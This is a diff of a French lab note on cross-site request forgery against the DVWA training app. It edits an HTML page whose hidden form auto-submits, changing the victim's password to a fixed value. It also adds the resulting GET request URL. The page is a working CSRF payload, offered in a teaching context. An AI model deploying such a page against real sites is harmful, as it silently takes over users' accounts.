@@ -17,10 +17,10 @@ html lang="fr">	<head>
 		<header>
 		</header>
 		<main>
-			<form id="my_form" method="GET" action="http://192.168.1.10:81/dvwa/vulnerabilities/csrf/">
-				<input type="text" name="password_new" value="azerty123+" />
-				<input type="text" name="password_conf" value="azerty123+" />
-				<input type="text" name="Change" value="Change" />
+			<form id="my_form" method="GET" action="<mon_site>">
+				<input type="hidden" name="password_new" value="azerty123+" />
+				<input type="hidden" name="password_conf" value="azerty123+" />
+				<input type="hidden" name="Change" value="Change" />
 			</form>
 			<script>document.getElementById("my_form").submit();</script>
 		</main>
@@ -29,6 +29,8 @@ html lang="fr">	<head>
 	</body>
 </html>
 ```
+Résultat: "http://<mon_site>/?password_new=azerty123%2B&password_conf=azerty123%2B&Change=Change"
+
 
 ## HTTP methode = POST
 
